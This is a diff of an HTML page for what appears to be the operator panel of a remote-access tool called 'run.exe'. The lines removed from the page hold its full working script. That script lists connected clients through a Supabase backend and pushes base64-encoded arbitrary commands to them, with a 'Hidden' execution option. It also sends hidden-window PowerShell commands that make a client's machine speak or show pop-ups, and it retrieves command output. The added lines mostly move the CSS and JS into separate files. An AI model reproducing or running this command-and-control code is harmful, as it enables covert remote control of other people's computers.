@@ -3,356 +3,11 @@
 
 <head>
     <title>run.exe client panel</title>
-    <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
-
-        body {
-            background: #000;
-            color: #fff;
-            font-family: 'Consolas', 'Monaco', monospace;
-            min-height: 100vh;
-            user-select: none;
-            overflow-x: hidden;
-            line-height: 1.5;
-        }
-
-        .panel {
-            padding: 2rem;
-            min-height: 100vh;
-            max-width: 1600px;
-            margin: 0 auto;
-        }
-
-        .toolbar {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            margin-bottom: 2rem;
-            padding-bottom: 1rem;
-            border-bottom: 1px solid #333;
-        }
-
-        .toolbar-title {
-            font-size: 16px;
-            letter-spacing: 0.1em;
-            text-transform: uppercase;
-            font-weight: bold;
-            color: #fff;
-        }
-
-        .toolbar-right {
-            display: flex;
-            gap: 12px;
-            align-items: center;
-        }
-
-        .github-link {
-            color: #888;
-            transition: color 0.2s;
-            display: flex;
-            align-items: center;
-            margin-right: 10px;
-        }
-
-        .github-link:hover {
-            color: #fff;
-        }
-
-        .count-badge {
-            font-size: 13px;
-            padding: 4px 12px;
-            border-radius: 4px;
-            background: #111;
-            border: 1px solid #444;
-            color: #bbb;
-        }
-
-        .count-badge span {
-            color: #fff;
-            font-weight: bold;
-        }
-
-        .grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
-            gap: 20px;
-        }
-
-        .user-card {
-            background: #0a0a0a;
-            border: 1px solid #333;
-            border-radius: 4px;
-            padding: 1.25rem;
-            cursor: default;
-            transition: all 0.2s;
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-        }
-
-        .user-card:hover {
-            background: #111;
-            border-color: #666;
-            transform: translateY(-2px);
-        }
-
-        .card-header {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-
-        .status-ring {
-            width: 10px;
-            height: 10px;
-            border-radius: 50%;
-            flex-shrink: 0;
-        }
-
-        .status-green {
-            background: #fff;
-            box-shadow: 0 0 5px #fff;
-        }
-
-        .status-yellow {
-            background: #f0c040;
-        }
-
-        .status-red {
-            background: #444;
-        }
-
-
-        .card-username {
-            font-size: 15px;
-            font-weight: bold;
-            color: #fff;
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
-            flex: 1;
-        }
-
-        .card-username.offline {
-            color: #666;
-            font-weight: normal;
-        }
-
-        .card-ts {
-            font-size: 12px;
-            color: #999;
-            height: 18px;
-        }
-
-        .card-actions {
-            display: grid;
-            grid-template-columns: repeat(4, 1fr);
-            gap: 6px;
-            width: 100%;
-        }
-
-        .card-btn {
-            font-size: 11px;
-            height: 30px;
-            border-radius: 2px;
-            cursor: pointer;
-            background: #111;
-            border: 1px solid #333;
-            color: #ccc;
-            font-family: inherit;
-            transition: all 0.1s;
-            text-align: center;
-            font-weight: bold;
-            position: relative;
-        }
-
-        .card-btn .btn-hint {
-            position: absolute;
-            top: 3px;
-            right: 3px;
-            font-size: 9px;
-            padding: 1px 4px;
-            line-height: 1;
-            pointer-events: none;
-        }
-
-        .card-btn:hover {
-            border-color: #fff;
-            color: #fff;
-            background: #222;
-        }
-
-        .card-btn.primary {
-            border-color: #444 !important;
-            color: #fff !important;
-            background: #1a1a1a !important;
-        }
-
-        .card-btn.disabled {
-            opacity: 0.3;
-            pointer-events: none;
-        }
-
-        .popup-overlay {
-            position: fixed;
-            inset: 0;
-            z-index: 100;
-            background: rgba(0, 0, 0, 0.9);
-            display: none;
-            align-items: center;
-            justify-content: center;
-            backdrop-filter: blur(8px);
-        }
-
-        .popup-overlay.open {
-            display: flex;
-        }
-
-        .popup-box {
-            background: #0a0a0a;
-            border: 1px solid #444;
-            border-radius: 4px;
-            padding: 1.5rem;
-            min-width: 450px;
-            max-width: 550px;
-            width: 95%;
-            box-shadow: 0 0 0 1px #000, 0 20px 50px rgba(0, 0, 0, 1);
-        }
-
-        .popup-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 15px;
-            border-bottom: 1px solid #333;
-            padding-bottom: 10px;
-        }
-
-        .popup-title {
-            font-size: 11px;
-            color: #999;
-            letter-spacing: 0.15em;
-            text-transform: uppercase;
-        }
-
-        .popup-target {
-            color: #fff;
-            font-size: 16px;
-            font-weight: bold;
-        }
-
-        .popup-input {
-            width: 100%;
-            background: #000;
-            border: 1px solid #444;
-            border-radius: 2px;
-            color: #fff;
-            font-family: inherit;
-            font-size: 14px;
-            padding: 12px;
-            outline: none;
-            resize: vertical;
-            margin-bottom: 15px;
-        }
-
-        .popup-input:focus {
-            border-color: #888;
-        }
-
-        .opt-btn {
-            flex: 1;
-            background: #111;
-            border: 1px solid #333;
-            padding: 8px;
-            color: #888;
-            font-size: 10px;
-            font-weight: bold;
-            font-family: inherit;
-            cursor: pointer;
-            transition: 0.2s;
-            text-transform: uppercase;
-        }
-
-        .opt-btn.active {
-            border-color: #fff;
-            color: #fff;
-            background: #222;
-        }
-
-        .option-row {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            margin-bottom: 15px;
-        }
-
-        .option-row .btn-hint {
-            margin-left: 2px;
-            white-space: nowrap;
-        }
-
-        .popup-footer {
-            display: flex;
-            justify-content: flex-end;
-            align-items: center;
-            border-top: 1px solid #333;
-            padding-top: 20px;
-        }
-
-        .popup-actions {
-            display: flex;
-            gap: 10px;
-        }
-
-        .popup-btn {
-            font-size: 12px;
-            padding: 8px 16px;
-            border-radius: 2px;
-            cursor: pointer;
-            font-family: inherit;
-            border: 1px solid #444;
-            background: #111;
-            color: #fff;
-            font-weight: bold;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .popup-btn.confirm {
-            background: #fff;
-            color: #000;
-            border-color: #fff;
-        }
-
-        .popup-btn.confirm:hover {
-            background: #ccc;
-        }
-
-        .btn-hint {
-            font-size: 10px;
-            background: #333;
-            color: #fff;
-            padding: 2px 5px;
-            border-radius: 2px;
-        }
-
-        .empty {
-            color: #555;
-            text-align: center;
-            padding: 100px 0;
-            font-size: 14px;
-            letter-spacing: 2px;
-        }
-    </style>
+    <link rel="stylesheet" href="styles.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
 </head>
 
 <body>
-
     <div class="panel" id="app">
         <div class="toolbar">
             <span class="toolbar-title">run.exe // client panel</span>
@@ -364,8 +19,10 @@
                         </path>
                     </svg>
                 </a>
-                <span class="count-badge">online: <span id="online-count">0</span></span>
-                <span class="count-badge">total: <span id="total-count">0</span></span>
+                <div class="count-badge-container">
+                    <span class="count-badge">online: <span id="online-count">0</span></span>
+                    <span class="count-badge">total: <span id="total-count">0</span></span>
+                </div>
             </div>
         </div>
         <div class="grid" id="user-grid">
@@ -379,21 +36,41 @@
                 <span class="popup-title" id="popup-mode-label">COMMAND</span>
                 <span class="popup-target" id="popup-target-label">TARGET_USER</span>
             </div>
-
+    
             <textarea class="popup-input" id="popup-input" rows="4" placeholder="Enter payload or text..."></textarea>
-
+    
             <div id="vis-section" style="display:none;" class="option-row">
                 <button class="opt-btn" id="vis-true" tabindex="-1">Visible</button>
                 <button class="opt-btn" id="vis-false" tabindex="-1">Hidden</button>
                 <span class="btn-hint">SHIFT</span>
             </div>
-
+    
             <div id="voice-section" style="display:none;" class="option-row">
                 <button class="opt-btn" id="voice-david" tabindex="-1">David</button>
                 <button class="opt-btn" id="voice-zira" tabindex="-1">Zira</button>
                 <span class="btn-hint">SHIFT</span>
+    
             </div>
-
+            <div id="voice-config" style="display: flex;" class="option-column">
+                <div id="config-volume">
+                    <span class="hint">VOL</span>
+                    <span id="volume-value">100%</span>
+                    <input type="range" id="volume-slider" min="0" max="100" value="100" class="slider">
+    
+                </div>
+                <div id="config-speed">
+                    <span class="hint">SPD</span>
+                    <span id="speed-value">0</span>
+                    <input type="range" id="speed-slider" min="-10" max="10" value="0" class="slider">
+                </div>
+                <div id="config-pitch">
+<!-- six seven-->
+                    <span class="hint">PIT</span>
+                    <span id="pitch-value">0</span>
+                    <input type="range" id="pitch-slider" min="-10" max="10" value="0" class="slider">
+                </div>
+            </div>
+    
             <div class="popup-footer">
                 <div class="popup-actions">
                     <button class="popup-btn" id="popup-cancel">
@@ -407,244 +84,7 @@
         </div>
     </div>
 
-    <script>
-        const state = {
-            rows: [],
-            url: localStorage.getItem('supa_url'),
-            apiKey: localStorage.getItem('supa_key'),
-            popupMode: null,
-            popupUser: null,
-            hoveredUser: null,
-            selectedVoice: 'David',
-            selectedVis: true
-        };
-
-        const $ = id => document.getElementById(id);
-
-        document.addEventListener('contextmenu', e => e.preventDefault());
-
-        function getStatus(user) {
-            const diff = (Date.now() - new Date(user.updated_at).getTime()) / 1000;
-            if (diff < 10) return 'green';
-            if (diff < 60) return 'yellow';
-            return 'red';
-        }
-
-        function updateOptionsUI() {
-            $('voice-david').className = 'opt-btn' + (state.selectedVoice === 'David' ? ' active' : '');
-            $('voice-zira').className = 'opt-btn' + (state.selectedVoice === 'Zira' ? ' active' : '');
-            $('vis-true').className = 'opt-btn' + (state.selectedVis ? ' active' : '');
-            $('vis-false').className = 'opt-btn' + (!state.selectedVis ? ' active' : '');
-        }
-
-        function renderGrid() {
-            const grid = $('user-grid');
-            const sorted = [...state.rows].sort((a, b) => {
-                const order = { green: 0, yellow: 1, red: 2 };
-                return order[getStatus(a)] - order[getStatus(b)] || a.username.localeCompare(b.username);
-            });
-
-            $('online-count').textContent = sorted.filter(u => getStatus(u) === 'green').length;
-            $('total-count').textContent = sorted.length;
-
-            if (!sorted.length) {
-                grid.innerHTML = '<div class="empty">NO CLIENTS CONNECTED</div>';
-                return;
-            }
-
-            grid.innerHTML = '';
-            sorted.forEach((user, index) => {
-                const status = getStatus(user);
-                const alive = status === 'green';
-                const card = document.createElement('div');
-                card.className = 'user-card';
-
-                const lastSeenDate = new Date(user.updated_at);
-                const tsText = alive ? '' : `Last seen: ${lastSeenDate.toLocaleDateString()} ${lastSeenDate.toLocaleTimeString()}`;
-
-                const showHint = index === 0;
-
-                card.innerHTML = `
-            <div class="card-header">
-                <div class="status-ring status-${status}"></div>
-                <span class="card-username ${alive ? '' : 'offline'}">${user.username}</span>
-            </div>
-            <div class="card-ts">${tsText}</div>
-            <div class="card-actions">
-                <button class="card-btn primary ${alive ? '' : 'disabled'}" data-action="cmd">
-                    CMD ${showHint ? '<span class="btn-hint">C</span>' : ''}
-                </button>
-                <button class="card-btn ${alive ? '' : 'disabled'}" data-action="speak">
-                    SPK ${showHint ? '<span class="btn-hint">S</span>' : ''}
-                </button>
-                <button class="card-btn ${alive ? '' : 'disabled'}" data-action="popup_msg">
-                    MSG ${showHint ? '<span class="btn-hint">A</span>' : ''}
-                </button>
-                <button class="card-btn" data-action="output">
-                    OUT ${showHint ? '<span class="btn-hint">V</span>' : ''}
-                </button>
-            </div>
-        `;
-
-                card.addEventListener('mouseenter', () => state.hoveredUser = user);
-                card.addEventListener('mouseleave', () => state.hoveredUser = null);
-
-                card.addEventListener('click', e => {
-                    const btn = e.target.closest('.card-btn');
-                    if (!btn) return;
-
-                    const action = btn.dataset.action;
-                    if (!action) return;
-                    if (action === 'cmd') openPopup('cmd', user);
-                    if (action === 'speak') openPopup('speak', user);
-                    if (action === 'popup_msg') openPopup('popup_msg', user);
-                    if (action === 'output') doViewOutput(user);
-                });
-                grid.appendChild(card);
-            });
-        }
-
-        function openPopup(mode, user) {
-            state.popupMode = mode;
-            state.popupUser = user;
-            state.selectedVis = user.visible;
-
-            $('popup-input').value = '';
-            $('popup-target-label').textContent = user.username;
-            $('popup-overlay').classList.add('open');
-
-            $('vis-section').style.display = (mode === 'cmd') ? 'flex' : 'none';
-            $('voice-section').style.display = (mode === 'speak') ? 'flex' : 'none';
-
-            if (mode === 'cmd') $('popup-mode-label').textContent = 'Execute Command';
-            else if (mode === 'speak') $('popup-mode-label').textContent = 'Voice Message';
-            else $('popup-mode-label').textContent = 'Message Box';
-
-            updateOptionsUI();
-            setTimeout(() => $('popup-input').focus(), 50);
-        }
-
-        function closePopup() {
-            $('popup-overlay').classList.remove('open');
-            state.popupMode = null;
-            state.popupUser = null;
-        }
-
-        function formatPSString(str) {
-            const escaped = str.replace(/'/g, "''");
-            return escaped.split(/\r?\n/).map(line => `'${line}'`).join(' + [char]13 + ');
-        }
-
-        async function doSendPopup() {
-            const user = state.popupUser;
-            const mode = state.popupMode;
-            const val = $('popup-input').value.trim();
-            if (!user) return;
-
-            let rawCmd = '';
-            if (val) {
-                if (mode === 'cmd') rawCmd = val;
-                else if (mode === 'speak') {
-                    const msg = formatPSString(val);
-                    rawCmd = `powershell -W H -C "$s=New-Object -Com SAPI.SpVoice;$s.Voice=$s.GetVoices()|Where-Object{$_.GetDescription() -like '*${state.selectedVoice}*'};$s.Speak(${msg})"`;
-                } else {
-                    const msg = formatPSString(val);
-                    rawCmd = `powershell -W H -C "(New-Object -Com WScript.Shell).Popup(${msg})"`;
-                }
-            }
-
-            const body = {};
-            if (rawCmd) { body.cmd = btoa(rawCmd); body.run = true; }
-            if (mode === 'cmd') body.visible = state.selectedVis;
-
-            try {
-                await fetch(`${state.url}?username=eq.${user.username}`, {
-                    method: 'PATCH',
-                    headers: { apikey: state.apiKey, Authorization: `Bearer ${state.apiKey}`, 'Content-Type': 'application/json' },
-                    body: JSON.stringify(body)
-                });
-                closePopup();
-                fetchData();
-            } catch (e) { console.error("Trans Error", e); }
-        }
-
-        async function doViewOutput(user) {
-            try {
-                const res = await fetch(`${state.url}?select=out&username=eq.${user.username}`, {
-                    headers: { apikey: state.apiKey, Authorization: `Bearer ${state.apiKey}` }
-                });
-                const data = await res.json();
-                if (data[0]?.out) {
-                    const decoded = atob(data[0].out);
-                    navigator.clipboard.writeText(decoded).catch(() => { });
-                    alert(decoded);
-                }
-            } catch (e) { console.error(e); }
-        }
-
-        async function fetchData() {
-            try {
-                const res = await fetch(`${state.url}?select=username,updated_at,visible`, {
-                    headers: { apikey: state.apiKey, Authorization: `Bearer ${state.apiKey}` }
-                });
-                state.rows = await res.json();
-                renderGrid();
-            } catch (e) { console.error(e); }
-        }
-
-        function init() {
-            if (!state.url || !state.apiKey) {
-                const u = prompt('Supabase URL:');
-                const k = prompt('API Key:');
-                if (u && k) {
-                    state.url = u; state.apiKey = k;
-                    localStorage.setItem('supa_url', u);
-                    localStorage.setItem('supa_key', k);
-                }
-            }
-
-            fetchData();
-            setInterval(fetchData, 4000);
-
-            $('voice-david').onclick = () => { state.selectedVoice = 'David'; updateOptionsUI(); };
-            $('voice-zira').onclick = () => { state.selectedVoice = 'Zira'; updateOptionsUI(); };
-            $('vis-true').onclick = () => { state.selectedVis = true; updateOptionsUI(); };
-            $('vis-false').onclick = () => { state.selectedVis = false; updateOptionsUI(); };
-
-            document.addEventListener('keydown', e => {
-                if (state.popupMode) {
-                    if (e.key === 'Escape') closePopup();
-                    if (e.key === 'Shift' && document.activeElement !== $('popup-input')) {
-                        if (state.popupMode === 'speak') {
-                            state.selectedVoice = (state.selectedVoice === 'David' ? 'Zira' : 'David');
-                        } else if (state.popupMode === 'cmd') {
-                            state.selectedVis = !state.selectedVis;
-                        }
-                        updateOptionsUI();
-                    }
-                    return;
-                }
-                const u = state.hoveredUser;
-                if (!u) return;
-                const alive = getStatus(u) === 'green';
-                const key = e.key.toLowerCase();
-                if (key === 'c' && alive) openPopup('cmd', u);
-                if (key === 's' && alive) {
-                    state.selectedVoice = e.shiftKey ? 'Zira' : 'David';
-                    openPopup('speak', u);
-                }
-                if (key === 'a' && alive) openPopup('popup_msg', u);
-                if (key === 'v') doViewOutput(u);
-            });
-
-            $('popup-cancel').onclick = closePopup;
-            $('popup-confirm').onclick = doSendPopup;
-            $('popup-input').addEventListener('keydown', e => {
-                if (e.key === 'Enter' && (e.ctrlKey || e.metaKey)) doSendPopup();
-            });
-        }
-        init();
-    </script>
+    <script src="script.js"></script>
 </body>
 
 </html>
